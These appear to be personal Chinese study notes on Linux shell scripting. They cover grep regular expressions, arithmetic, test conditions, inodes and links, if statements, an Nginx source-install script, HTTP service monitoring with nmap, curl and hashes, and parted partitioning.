![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C%E5%8A%A8%E7%94%BB.gif)

![image-20220315161213602](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315161213602.png)

过滤文件的非空白行

#### font color = 'yellow'>扩展正则表达式

![image-20220315164848822](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315164848822.png)

再看几个使用扩展正则表达式的案例，由于输出信息与基本正则表达式类似，这里仅写出命令而不再打印输出信息。另外grep命令默认不支持扩展正则表达式，需要使用grep -E或者使用egrep命令进行扩展正则表达式的过滤。

![image-20220315165337334](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315165337334.png)

![image-20220315165410517](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315165410517.png)

找出0出现1此或者两次的行

![image-20220315165427519](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315165427519.png)

小写的e不行

![image-20220315171252338](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315171252338.png)

直接查找至少一个0的行

#### POSIX规范的正则表达式

由于基本正则表达式会有语系的问题，所以这里需要了解POSIX规范的正则表达式规则。例如，在基本正则表达式中可以使用a～z来匹配所有字母，但如果需要匹配的对象是中文字符怎么办呢？或是像“ن”这样的阿拉伯语字符怎么办？所以使用a～z匹配仅针对英语语系中的所有字母，POSIX其实是由一系列规范组成的，这里仅介绍POSIX正则表达式规范。POSIX正则表达式规范帮助我们解决语系问题，另外POSIX规范的正则表达式也比较接近于自然语言

![image-20220315171645126](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315171645126.png)

![image-20220315171940822](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315171940822.png)

匹配所有数字字符   （注意： 不是把行提取出来哦）

但是针对这种模式  有个缺点

不能只把有这个特征的行找出来

但是我们可以grep -o把匹配的那些字符弄出来

![image-20220315172648206](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315172648206.png)

#### font color = 'yellow'>GNU规范

Linux中的GNU软件一般支持转义元字符，这些转义元字符有：\b（边界字符，匹配单词的开始或结尾）, \B（与\b为反义词，\Bthe\B不会匹配单词the，仅会匹配the在中间的单词，如atheist）, \w（等同于[_[:alnum:]]）, \W（等同于[^_[:alnum:]]）。另外有部分软件支持使用\d表示任意数字，\D表示任意非数字。\s表示任意空白字符（空格、制表符等）, \S表示任意非空白字符。

![image-20220315172942940](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315172942940.png)

匹配a结尾的字符  当然单词a也是以a结尾

![image-20220315173154468](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315173154468.png)

就是the在单词的中间

![image-20220315173214733](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315173214733.png)

就是the在单词的头部

![image-20220315174446316](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315174446316.png)

-P使用perl的正则

### 1.7各种各样的算数运算

Shell支持多种算术运算，可以使用$（（表达式））、$[表达式]、let表达式进行整数的算术运算，注意这些命令无法执行小数运算；使用bc命令可以进行小数运算。

![image-20220315175216706](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175216706.png)

![image-20220315175022282](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175022282.png)

![image-20220315175030787](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175030787.png)

接下来，学习使用内置命令let进行算术运算的案例。注意，使用let命令计算时，默认不会输出运算的结果，一般需要将运算的结果赋值给变量，通过变量查看运算结果。另外，使用let命令对变量进行计算时，不需要在变量名前添加$符号。

![image-20220315175706548](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175706548.png)

let是无法直接输出明文的     但是却可以进行运算 

然后echo输出

![image-20220315175832982](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175832982.png)

let无法进行小速点的运算

Bash仅支持对整数的四则运算，不支持对小数的运算。如果我们需要在脚本中对任意精度的小数进行运算甚至编写计算函数，则可以使用bc计算器实现。bc计算器支持交互和非交互两种执行方式。

先看看在交互模式下的计算方式，一行代码为一条命令，可以进行多次计算。

（bc需要手动安装）

![image-20220315190948088](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315190948088.png)

除了在交互模式下使用bc计算器，还可以通过非交互的方式进行计算。而且通过bc计算器的另外两个内置变量ibase（in）和obase（out）可以进行进制转换，ibase用来指定输入数字的进制，obase用来设置输出数字的进制，默认输入和输出的数字都是十进制的。

![image-20220315191331588](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315191331588.png)

![image-20220315191439318](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315191439318.png)

通过计算我们可以解决现实中的很多问题，下面这个需要计算结果的脚本案例中的每个部分都可以独立出来单独运行，也可以合并在一个文件中统一执行。

![image-20220315192336427](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315192336427.png)



## 2很人工 有很智能的脚本

### 2.1智能化脚本的基础测试

在Shell中可以使用多种方式进行条件判断，如[[表达式]]、[表达式]或者test表达式。使用条件表达式可以测试文件属性，进行字符或数字的比较。需要注意的是，不管使用哪种方式进行条件判断，系统默认都不会有任何输出结果，可以通过echo $？命令，查看上一条命令的退出状态码，或者使用&&和||操作符结合其他命令进行结果的输出操作。

警告：

表达式两边必须有空格，否则程序会出错。使用[[]]和test进行排序比较时，使用的比较符号不同。在test或[]中不能直接使用＜或＞符号进行排序比较。

如果需要在一行代码中输入多条命令，在Shell中可以使用；（分号）、&&（与）、||（或）这三个符号将多个命令分隔。其中；（分号）是按顺序执行命令，分号前后的命令可以没有任何逻辑关系。例如，输入“A命令；B命令”，系统会先执行A命令，不管A命令执行结果如何，都会执行B命令。整个命令的退出码以最后一条命令为准，B命令如果执行成功则退出码为0, B命令如果执行失败则退出码为非0。而使用&&（与）符号分隔多条命令时，仅当前一条命令执行成功后，才会执行&&后面的命令。例如，输入“A命令&&B命令”，系统会先执行A命令，如果A命令执行成功则执行B命令，如果A命令执行失败则不执行B命令。而整行命令的退出码取决于两条命令是否同时执行成功，如果A命令执行成功并且B命令执行也成功，则整行命令的退出码为0，而A命令或B命令中的任何一条命令执行失败，则整行命令的退出码为非0。如果使用||（或）符号分隔多条命令，仅当前一条命令不执行或执行失败后才执行后一条命令。例如，输入“A命令||B命令”，因为A命令是命令行的第一条命令，所以一定会执行，如果A命令执行成功了就不再执行B命令，如果A命令执行失败，则执行B命令，A命令和B命令为二选一的关系。A命令或B命令中有任何一条命令的退出码为0，则整行命令的退出码就是0，否则返回非0。

### 2.2字符串的判断与比较

![image-20220315193725330](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315193725330.png)

![image-20220315193733577](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315193733577.png)

![image-20220315193933836](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315193933836.png)

下面的测试，因为当前用户是cdxiaodong，测试结果为真，所以会执行echo Y命令，而当echo Y命令执行并成功后，则不再执行echoN，结果屏幕仅显示Y。

在表达式中使用-z可以测试一个字符串是否为空，下面测试一个未定义的变量TEST，如果变量值为空则屏幕显示Y，否则显示N。![image-20220315194848684](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315194848684.png)

在Shell中进行条件测试时一定要注意空格问题。使用[]测试时，左方括号右边和右方括号左边都必须有空格。而且测试的比较符号两边也必须都有空格。

下面这个例子==符号两边没有空格，无论怎么测试结果都为真，编写脚本时这种Bug系统不会提示语法错误，但程序结果有可能是错误的。

![image-20220315195235139](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195235139.png)

当测试一个未定义的变量时就会出故障。下面测试一个未定义的变量Jacob是否非空。为什么Jacob的度量值明明为空，但测试却说该变量值不为空呢？

![image-20220315195352937](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195352937.png)

![image-20220315195444386](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195444386.png)



### 2.3整数的判断与比较

比较两个数字可能的结果有等于、不等于、大于、大于或等于、小于、小于或等于这么几种情况，在Shell脚本中支持对整数的比较判断

![image-20220315195848902](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195848902.png)

![image-20220315195920876](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315195920876.png)

下面这个案例使用grep命令结合正则表达式，从meminfo文件中过滤当前系统剩余可用的内存容量，剩余容量以KiB为单位，最后测试剩余可用容量是否小于或等于500MiB。

![image-20220315200719182](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315200719182.png)

接下来使用ps命令，查看系统中所有启动的进程列表信息，结合wc命令还可以统计当前系统中已经启动的进程数量。这样，就可以判断是否启动了超过100个进程。

![image-20220315201131769](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315201131769.png)

![image-20220315201324759](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315201324759.png)

### 2.4文件属性的比较

Shell支持大量对文件属性的判断，常用的文件属性操作符很多

![image-20220315202346843](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315202346843.png)

下面这个测试，假设系统中有某个磁盘设备，使用-b测试该设备是否存在，且当该设备为块设备时返回值为真，否则返回值为假。

![image-20220315202729193](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315202729193.png)

Linux系统中的文件链接分为软链接和硬链接两种。软链接创建后，如果源文件被删除，则软链接将无法继续使用，可以跨分区和磁盘创建软链接。硬链接创建后，如果源文件被删除，则硬链接依然可以正常使用、正常读写数据，但硬链接不可以跨分区或磁盘创建。另外，硬链接与源文件使用的是相同的设备、相同的inode编号。使用ls -l[插图]命令查看硬链接文件的属性时，文件属性与普通文件是一样的，而软链接的文件属性则可以看到被l标记，表示该文件为软链接。

![image-20220315203222382](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315203222382.png)

创建软连接

![image-20220315203434841](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315203434841.png)

创建硬连接

![image-20220315203552744](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315203552744.png)

ls查看不同

![image-20220315203710346](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315203710346.png)

判断都是什么连接

在测试权限时需要注意，超级管理员root在没有rw权限的情况下，也是可以读写文件的，rw权限对超级管理员是无效的。但是如果文件没有x权限，哪怕是root也不可以执行该文件。

![image-20220315204119691](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315204119691.png)

![image-20220315204147071](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315204147071.png)

删除r权限 依然为真

因为我们是root权限

![image-20220315204948946](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315204948946.png)

给他加x后就 为真了

默认touch命令创建的文件都是空文件，在使用-s测试文件是否为非空文件时，因为文件是空文件，所以测试结果为假。当文件中有内容时，测试文件是否为非空时，结果为真。

![image-20220315205901890](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315205901890.png)

#### 补充:

软件中有一些比如istat stat 等控制img块的软件都是sleuthkit等的基础软件

使用他们有一个很基础的条件。就是要知道什么是inode

#### 这里就介绍什么是inode

inode包含文件的元信息，具体来说有以下内容：

```
* 文件的字节数

* 文件拥有者的User ID

* 文件的Group ID

* 文件的读、写、执行权限

* 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。

* 链接数，即有多少文件名指向这个inode

* 文件数据block的位置
```

总之，除了文件名以外的所有文件信息，都存在inode之中。至于为什么没有文件名，下文会有详细解释。

#### inode的大小

inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。

每 个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定 在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。

查看每个硬盘分区的inode总数和已经使用的数量，可以使用df[命令](https://www.linuxcool.com/)。

查看每个inode节点的大小，可以用如下命令

```bash
dumpe2fs -h /dev/hda | grep "Inode size"
```

像hda hdb啥的都是

硬盘文件。前提是你的虚拟机有硬盘分区而不是弄在同一块盘

像sda就是设备文件  也可以是磁盘 驱动u盘啥的

```
sudo dumpe2fs -h /dev/hda | grep "Inode size"
```

由于每个文件都必须有一个inode，因此有可能发生inode已经用光，但是硬盘还未存满的情况。这时，就无法在硬盘上创建新文件。

#### inode号码

每个inode都有一个号码，操作系统用inode号码来识别不同的文件。

这 里值得重复一遍，Unix/[Linux系统](https://www.linuxprobe.com/)内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或 者绰号。表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号 码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。

使用ls -i命令，可以看到文件名对应的inode号码：

#### 目录文件

ls -i命令列出整个目录文件，即文件名和inode号码：

如果要查看文件的详细信息，就必须根据inode号码，访问inode节点，读取信息。ls -l命令列出文件的详细信息。

```
ls -l /etc
```

其原理就是先读取inode再读取文件的详细信息

#### 硬链接

一 般情况下，文件名和inode号码是"一一对应"关系，每个inode号码对应一个文件名。但是，Unix/Linux系统允许，多个文件名指向同一个 inode号码。这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访 问。这种情况就被称为"硬链接"（hard link）。

ln命令可以创建硬链接：

```
ln 源文件 目标文件
```

运 行上面这条命令以后，源文件与目标文件的inode号码相同，都指向同一个inode。inode信息中有一项叫做"链接数"，记录指向该inode的文 件名总数，这时就会增加1。反过来，删除一个文件名，就会使得inode节点中的"链接数"减1。当这个值减到0，表明没有文件名指向这个inode，系 统就会回收这个inode号码，以及其所对应block区域。

这里顺便说一下目录文件的"链接数"。创建目录时， 默认会生成两个目录项："."和".."。前者的inode号码就是当前目录的inode号码，等同于当前目录的"硬链接"；后者的inode号码就是当 前目录的父目录的inode号码，等同于父目录的"硬链接"。所以，任何一个目录的"硬链接"总数，总是等于2加上它的子目录总数（含隐藏目录）,这里的 2是父目录对其的“硬链接”和当前目录下的".硬链接“。

#### 软链接

除了硬链接以外，还有 一种特殊情况。文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。因此，无论打 开哪一个文件，最终读取的都是文件B。这时，文件A就称为文件B的"软链接"（soft link）或者"符号链接（symbolic link）。

这 意味着，文件A依赖于文件B而存在，如果删除了文件B，打开文件A就会报错："No such file or directory"。这是软链接与硬链接最大的不同：文件A指向文件B的文件名，而不是文件B的inode号码，文件B的inode"链接数"不会因此 发生变化。

ln -s命令可以创建软链接。

ln -s 源文文件或目录 目标文件或目录

#### inode的特殊作用

由于inode号码与文件名分离，这种机制导致了一些Unix/Linux系统特有的现象。

\1. 有时，文件名包含特殊字符，无法正常删除。这时，直接删除inode节点，就能起到删除文件的作用。

\2. 移动文件或重命名文件，只是改变文件名，不影响inode号码。

\3. 打开一个文件以后，系统就以inode号码来识别这个文件，不再考虑文件名。因此，通常来说，系统无法从inode号码得知文件名。

第3点使得软件更新变得简单，可以在不关闭软件的情况下进行更新，不需要重启。因为系统通过inode号码，识别运行中的文件，不通过文件名。更新的时 候，新版文件以同样的文件名，生成一个新的inode，不会影响到运行中的文件。等到下一次运行这个软件的时候，文件名就自动指向新版文件，旧版文件的 inode则被回收。

#### 实际问题

在一台配置较低的Linux服务器（内存、硬盘比较小）的/data分区内创建文件时，系统提示磁盘空间不足，用df -h命令查看了一下磁盘使用情况，发现/data分区只使用了66%，还有12G的剩余空间，按理说不会出现这种问题。 后来用df -i查看了一下/data分区的索引节点(inode)，发现已经用满(IUsed=100%)，导致系统无法创建新目录和文件。

查找原因：

/data/cache目录中存在数量非常多的小字节缓存文件，占用的Block不多，但是占用了大量的inode。

解决方案：

1、删除/data/cache目录中的部分文件，释放出/data分区的一部分inode。

2、用软连接将空闲分区/opt中的newcache目录连接到/data/cache，使用/opt分区的inode来缓解/data分区inode不足的问题：

```
ln -s /opt/newcache /data/cache
```





### 2.5探究[[]]与[]的区别

多数情况下[]和[[]]是可以通用的，两者的主要差异是：test或[]是符合POSIX标准的测试语句，兼容性更强，几乎可以运行在所有Shell解释器中，相比较而言[[]]仅可运行在特定的几个Shell解释器中（如Bash、Zsh等）。事实上，目前支持使用[[]]进行条件测试的解释器已经足够多了。使用[[]]进行测试判断时甚至可以使用正则表达式。

看两者的差异点。其中，在[[]]中使用＜和＞符号时，系统进行的是排序操作，而且支持在测试表达式内使用&&和||符号。在test或[]测试语句中不可以使用&&和||符号。

**注意**

[[ ]]中的表达式如果使用＜或＞进行排序比较，使用的是本地的locale语言顺序。可以使用LANG=C设置在排序时使用标准的ASCII码顺序。在ASCII码的顺序中，小写字母顺序码＞大写字母顺序码＞数字顺序码。

![image-20220315210828490](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315210828490.png)

虽然[]也支持同时进行多个条件的逻辑测试，但是在[]中需要使用-a和-o进行逻辑与和逻辑或的比较操作，而[[]]中可以直接使用&&和||进行逻辑比较操作，更直观，可读性更好。

![image-20220315211533164](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220315211533164.png)

![image-20220315211724947](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315211724947.png)

需要注意的还有比较符，在[[]]中是模式匹配，模式匹配允许使用通配符。例如，Bash常用的通配符有*、? 、[…]等。而==在test语句中仅代表字符串的精确比较，判断字符串是否一模一样。![image-20220315212045331](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315212045331.png)

测试变量name的值是否是J和cob中间有任意单个字符？结果为真。

==同样是使用==进行比较操作，但在[]中系统进行的是字符串的比较操作，判断两个字符串是否绝对相同。==

![image-20220315212403815](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315212403815.png)

另外，在[[]]中还支持使用=～进行正则匹配，而在[]中则完全不支持正则匹配。

![image-20220315212813847](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315212813847.png)

对变量name的值进行正则匹配，判断name的值是否包含字母w。

下图中列出了[[]]和[]的差异汇总信息

![image-20220315212938654](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315212938654.png)

### 2.6系统性能监控脚本

下面我们来编写一个检测系统环境、监控系统性能的脚本，并判断各项数据指标是否符合预设的阈值。如果数据有异常，那么将结果通过邮件发送给本机root账户。在实际生产环境能联网的情况下，也可以发送邮件给某个外网的邮件账户。

注意脚本中的很多预设值只是假设值，在实际生产环境中还需要根据业务和环境的需要，调整这些预设值。限于篇幅，本脚本仅获取部分性能参数指标，如果还有其他需要监控的数据，也可以使用类似的方法获取。另外，在过滤数据时暂时使用cut命令，学习后面章节的awk命令后，过滤数据会变得更简单。

![image-20220315214343127](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214343127.png)

![image-20220315214350665](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214350665.png)

![image-20220315214402391](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220315214402391.png)

![image-20220315214415527](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214415527.png)

![image-20220315214422992](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214422992.png)

![image-20220315214430183](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214430183.png)

![image-20220315214436541](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214436541.png)

![image-20220315214445707](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315214445707.png)

![image-20220315215004938](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315215004938.png)

因为kali默认没装mail 这里就不作演示了

### 2.7实战：单支if语句

对于简单的条件判断，结合&&和||就可以完成大量的脚本。但是当脚本越写越复杂、功能越写越完善时，简单的&&和||就不足以满足需求了。

此时，选择使用if语句结合各种判断条件，功能会更加完善和强大。在Shell脚本中if语句有三种格式，分别是单分支if语句、双分支if语句和多分支if语句。下面是单分支if语句的语法格式。

![image-20220316165124397](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316165124397.png)

if和then可以写在同一行。同一行中如果需要编写多条命令，中间需要使用分号分隔命令。所以，单分支if语句也可以写成如下格式。

![image-20220316165339464](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316165339464.png)

单分支if语句会检查条件测试的结果，只要返回的结果为真，那么就会执行then后面的命令序列（可以包含一条或多条命令）。但如果测试条件返回的结果为假，那么if语句就什么命令也不执行。这里的条件测试除了可以是字符串的比较测试、数字的比较测试、文件或目录属性的测试，还可以是一条或多条命令。

![image-20220316165606884](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316165606884.png)

下面我们看一个单分支if语句的例子，读取用户输入的用户名和密码后，脚本通过if判断用户名和密码是否非空，如果非空则创建账户并设置密码，否则脚本直接结束。执行脚本，当提示输入用户名和密码时，如果我们都不输入（直接按回车键），脚本就会退出。

![image-20220316184045404](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184045404.png)

但是，上面的脚本有一个问题。当执行脚本提示输入用户名时，直接按回车键，而当提示输入密码时，正常输入一个密码，这时运行脚本就会报错。因为这样导致在账户没有创建成功的情况下，修改账户密码，结果一定会报错。因此，还需要继续优化这个脚本，可以使用嵌套if语句（在if语句里面再使用if语句）来解决该问题

![image-20220316184027896](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184027896.png)

![image-20220316184223876](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184223876.png)

![image-20220316184300332](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184300332.png)

这样做的好处是，如果账户名为空，则脚本就不会执行then后面的命令，也就不会对密码做任何测试动作，更不会修改账户密码，而是直接退出脚本。如果测试账户名为非空，则进一步对密码进行测试，如果密码也非空，那么就执行then后的命令，创建账户并设置密码。

提示：if语句后面的条件测试语句不一定非要是test或[]测试语句，任何有返回值的命令都可以写在if语句后面，命令返回值为0代表执行成功（即为真），返回值非0代表执行失败（即为假）。

![image-20220316184734698](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316184734698.png)

### 2.8实战：双if分支语句

与单分支if语句的格式一样，then和if可以写在同一行，也可以分开写在不同行。甚至在else和命令序列1中间添加分号将其写在同一行，但很少有人这样写，这将导致代码的可读性非常差。

```shell
if  ; then 
   命令
else 
   命令
fi
```

双分支if语句会检查条件测试的结果，只要测试条件返回值结果为真，就会执行命令序列1（可以包含一条或多条命令）。但如果测试条件返回值结果为假，那么就会执行命令序列2。所以双分支if语句，不管条件是否成立，都会执行特定的命令

![image-20220316190745091](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316190745091.png)

因为RPM等类似的二进制软件往往不能提供最新的版本，并且不具备自定义安装选项，所以生产环境中经常需要采用源码的方式安装软件。但采用源码的方式安装软件的步骤又比较烦琐，所以编写脚本实现自动化安装软件是非常重要的。下面看一个采用源码的方式安装软件的脚本案例。

![image-20220316200416656](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316200416656.png)

![image-20220316200434901](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316200434901.png)

脚本的第一个功能是通过使用变量的方式，定义echo回显的颜色属性。echo命令的-n选项，可以在回显数据后不按回车键即可换行，-e选项开启右斜线（\）转义的解释功能。

通过对系统环境变量UID的比较测试，判断当前执行脚本的用户是否为管理员。如果不是管理员，则脚本直接提示错误并退出。

使用rpm -q可以查询某个软件是否已经安装。再通过--quiet选项，设置无论软件是否已经安装都不在屏幕上回显结果，而是通过if语句自动判断命令的执行结果是真还是假。如果未安装wget，则脚本提示错误并退出。反之，在系统中已有wget工具的情况下，联网下载Nginx源码包软件[插图]。wget命令的-c选项可以开启断点续传的功能，下载过程中如果突然断网，联网后可以从上次的断点处继续下载，而不需要将文件全部重新下载。

（rpm有个缺陷  如果是编译安装 会检测不到，像我们kali使用的apt安装的软件 用rpm是检测不到的）

![image-20220316201536098](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316201536098.png)



可以使用骚操作

$(whereis wget) == wget

或者自定义查找

$(whereis $softname) == $softname

https://blog.csdn.net/bigwood99/article/details/105163508

但是实在不好写

建议使用type或which 当然find写入文本然后正则添加也可以

直接 type wget >/dev/null 2>&1

![image-20220316203819822](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316203819822.png)

![image-20220316203906393](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316203906393.png)

还是可以的

启动Nginx服务时，以普通用户的身份登录会更安全。脚本通过Id命令检查nginx账户是否已经存在，如果不存在nginx账户，则脚本会自动创建该账户。

在编译源码安装Nginx时，首先需要安装该软件包依赖的相关软件包，脚本中安装了gcc、pcre-devel、zlib-devel、openssl-devel这四个软件包，这些软件都在CentOS标准的Yum中，并且在安装openssl-devel时会自动安装zlib-devel。所以，哪怕不通过Yum明确要求安装zlib-devel，也会在安装openssl-devel时自动安装zlib-devel。Nginx是模块化的软件，可以通过＜--with-模块＞的方式启动某个模块的功能，不需要的功能模块，可以通过＜--without-模块＞的方式禁用。

### 2.9实战：如何监控监控http服务状态

就是nmap利用SYN+ACK

之前写yak和go的时候都拿这个入手,不过我们不用ACK

这样就叫做半半式扫描 这样更快

虽然使用Nmap可以快速地对大量端口进行扫描，但是仅使用端口扫描作为HTTP状态检查的依据，也有其自身的问题。如果服务已经启动，而且HTTP端口也已经开放给客户端，此时如果网站服务器上的网页已经被人恶意或无意删除，就会导致客户端可以成功连接服务器的80端口，但是访问页面时会报错404，说明页面文件找不到。此时不仅需要对端口进行检测，还需要对服务器返回的HTTP状态码进行检测。更有甚者，如果服务器端口已经启动，网页也还存在，但服务器被入侵，并且篡改了网页的数据，又该怎么办呢？还可以对数据的Hash值进行校验，检测网页数据是否被篡改。

如果希望在测试端口的基础上继续测试特定的页面是否可用，可以使用cURL工具进行测试。cURL是命令行的文件传输工具，支持很多种协议，如FTP、HTTP、HTTPS、IMAP、SMTP、POP3等

cURL常用的有效名称

![image-20220316205304159](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316205304159.png)

![image-20220316205402209](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316205402209.png)

上面的脚本可以根据网页文件是否可以被访问来测试服务器的健康状态。然而，当网页的数据内容被人恶意篡改后，虽然网页依然可以被访问，但服务器的健康状态已经出问题了！此时，可以使用Hash值对数据的完整性进行校验，以防止数据被篡改。数据Hash值的特点就是当数据发生改变时Hash值也会随之改变，如果数据没变化，则Hash值永远不变。在CentOS系统中提供了md5sum、sha1sum、sha256sum、sha384sum、sha512sum等可以计算Hash值的命令。

![image-20220316205520577](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316205520577.png)

![image-20220316205630685](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316205630685.png)

![image-20220316210329807](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316210329807.png)

### 2.10实战系列:多分支if语句

![image-20220316210452813](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316210452813.png)

多分支if语句工作流程如图2-4所示。如果if判断1成立（结果为真），则执行命令序列1中的命令，否则继续进行elif判断；如果elif判断2成立，则执行命令序列2中的命令，否则继续进行elif判断3，依此类推。如果所有的条件判断都不成立，则执行最后else语句中的命令序列n的命令。

![image-20220316210532229](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316210532229.png)

在CentOS7系统中提供了一个可以非交互创建磁盘分区的

parted命令的语法格式如下，常用磁盘操作指令

![image-20220316211405044](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220316211405044.png)

修改分区表类型

![image-20220317135145098](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317135145098.png)

![image-20220317135159832](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317135159832.png)

除了基本的创建与删除分区，利用parted命令还可以进行分区检查、调整分区大小、恢复误删除分区等操作，关于parted命令的更多使用方法，可以查阅man手册。接下来看如何通过脚本实现分区管理。

